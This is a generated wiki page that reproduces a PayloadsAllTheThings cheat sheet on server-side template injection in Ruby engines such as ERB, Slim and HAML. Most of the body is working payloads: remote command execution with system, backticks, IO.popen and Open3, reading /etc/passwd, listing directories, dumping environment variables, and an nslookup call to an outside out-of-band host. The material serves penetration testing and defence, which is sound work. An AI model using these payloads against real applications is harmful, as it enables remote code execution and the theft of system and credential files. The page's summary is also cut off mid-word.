---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Server Side Template Injection - Ruby

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-server-side-template-injection-ruby` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Template Injection/Ruby.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Ruby, SSTI can occur when using templating en

## Preserved Body

````markdown
> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Ruby, SSTI can occur when using templating engines like ERB (Embedded Ruby), Haml, liquid, or Slim, especially when user input is incorporated into templates without proper sanitization or validation.

## Templating Libraries

| Template Name | Payload Format |
|---------------|----------------|
| Erb           | `<%= %>`       |
| Erubi         | `<%= %>`       |
| Erubis        | `<%= %>`       |
| HAML          | `#{ }`         |
| Liquid        | `{{ }}`        |
| Mustache      | `{{ }}`        |
| Slim          | `#{ }`         |

## Universal Payloads

Generic code injection payloads work for many Ruby-based template engines, such as Erb, Erubi, Erubis, HAML and Slim.

To use these payloads, wrap them in the appropriate tag.

```ruby
%x('id') # Rendered RCE
File.read("Y:/A:/"+%x('id')) # Error-Based RCE
1/(system("id")&&1||0) # Boolean-Based RCE
system("id && sleep 5") # Time-Based RCE
```

## Ruby

### Ruby - Basic injections

**ERB**:

```ruby
<%= 7 * 7 %>
```

**Slim**:

```ruby
#{ 7 * 7 }
```

### Ruby - Retrieve /etc/passwd

```ruby
<%= File.open('/etc/passwd').read %>
```

### Ruby - List files and directories

```ruby
<%= Dir.entries('/') %>
```

### Ruby - Remote Command execution

Execute code using SSTI for **Erb**,**Erubi**,**Erubis** engine.

```ruby
<%=(`nslookup oastify.com`)%>
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

Execute code using SSTI for **Slim** engine.

```powershell
#{ %x|env| }
```

## References

- [Ruby ERB Template Injection - Scott White & Geoff Walton - September 13, 2017](https://web.archive.org/web/20181119170413/https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
````

## Source Verification

[source record](../../sources/payloadsallthethings/server-side-template-injection-ruby.md)

## Evidence Excerpt

```text
_body: "# Server Side Template Injection - Ruby\n\n> Server-Side Template Injection (SSTI)  is a vulnerability that arises\
\ when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands.\
\ In Ruby, SSTI can occur when using templating engines like ERB (Embedded Ruby), Haml, liquid, or Slim, especially when\
\ user input is incorporated into templates without proper sanitization or validation.\n\n## Summary\n\n- [Templating Libraries](#templating-libraries)\n\
- [Universal Payloads](#universal-payloads)\n- [Ruby](#ruby)\n    - [Ruby - Basic injections](#ruby---basic-injections)\n\
\    - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)\n    - [Ruby - List files and directories](#ruby---list-files-and-directories)\n\
\    - [Ruby - Remote Command execution](#ruby---remote-command-execution)\n- [References](#references)\n\n## Templating\
\ Libraries\n\n| Template Name | Payload Format |\n|---------------|----------------|\n| Erb           | `<%= %>`      \
```
